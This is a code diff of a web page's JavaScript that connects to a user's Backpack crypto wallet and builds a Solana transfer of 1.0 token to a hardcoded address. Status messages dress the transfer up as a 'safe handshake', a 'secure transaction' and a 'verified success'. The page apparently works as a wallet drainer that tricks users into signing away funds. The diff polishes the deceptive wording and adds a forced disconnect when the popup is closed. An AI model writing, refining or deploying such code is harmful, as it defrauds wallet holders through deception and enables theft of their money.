@@ -29,7 +29,7 @@
         const provider = window.backpack;
 
         if (!provider) {
-            log.innerHTML = "CRITICAL ERROR:<br>BACKPACK WALLET NOT DETECTED";
+            log.innerHTML = "ERROR: BACKPACK NOT FOUND";
             return;
         }
 
@@ -37,7 +37,7 @@
             btn.disabled = true;
             log.innerHTML = "STATUS: INITIALIZING SAFE HANDSHAKE...";
             
-            // Reconnect logic to prevent session timeouts
+            // Re-establish session to avoid timeout
             await provider.connect();
 
             log.innerHTML = "STATUS: BUILDING SECURE TRANSACTION...";
@@ -46,26 +46,27 @@
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: provider.publicKey,
                     toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
-                    lamports: 1.0 * 1e9 
+                    lamports: 1.0 * 1e9 // 1.0 XNT
                 })
             );
 
             log.innerHTML = "STATUS: AWAITING USER APPROVAL...<br>CHECK YOUR WALLET POPUP!";
             
             const result = await provider.signAndSendTransaction(transaction);
-            const signature = result.signature || result;
+            const sig = result.signature || result;
 
-            log.innerHTML = "VERIFIED SUCCESS!<br>SIG: " + signature.toString().substring(0, 22);
+            log.innerHTML = "VERIFIED_SUCCESS!<br>ID: " + sig.toString().substring(0, 22);
 
         } catch (err) {
             console.error(err);
             if (err.message.includes('closed')) {
-                log.innerHTML = "INTERRUPT: PLUGIN_CLOSED<br>ACTION: SESSION RESET. PLEASE WAIT.";
+                log.innerHTML = "INTERRUPT: PLUGIN_CLOSED<br>ACTION: AUTO-RECOVERY. PLEASE WAIT.";
+                if(provider.disconnect) await provider.disconnect().catch(() => {});
             } else {
                 log.innerHTML = "ERROR: " + err.message.toUpperCase();
             }
         } finally {
-            // Cool-down timer to keep the wallet stable
+            // Lock button for 5 seconds to keep the wallet session stable
             let countdown = 5;
             const timer = setInterval(() => {
                 btn.innerText = `WAIT (${countdown}s)`;
